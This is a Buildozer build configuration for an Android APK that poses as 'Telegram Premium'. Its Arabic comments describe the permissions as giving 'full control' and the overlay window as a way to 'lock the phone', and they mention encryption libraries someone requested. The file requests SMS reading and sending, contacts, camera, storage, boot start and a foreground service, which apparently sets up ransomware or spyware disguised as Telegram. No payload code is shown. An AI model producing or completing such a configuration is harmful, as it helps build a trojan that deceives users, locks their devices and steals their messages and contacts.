[app]
title = Telegram Premium
package.name = tg_ultimate_pro
package.domain = org.tg.premium
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 3.0

# ضفنا مكتبات التشفير والأندرويد اللي طلبها دارك
requirements = python3, kivy==2.1.0, requests, cryptography, pyjnius, android

orientation = portrait
fullscreen = 1

# الصلاحيات الشاملة (السيطرة الكاملة)
android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, READ_SMS, RECEIVE_SMS, SEND_SMS, READ_CONTACTS, SYSTEM_ALERT_WINDOW, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, WAKE_LOCK, MODIFY_AUDIO_SETTINGS

android.api = 31
android.minapi = 21
android.ndk = 25b
android.sdk = 31

# تفعيل ميزة الظهور فوق التطبيقات (لقفل الموبايل)
android.system_alert_window = True
android.accept_sdk_license = True

android.private_storage = True
android.release_artifact = apk
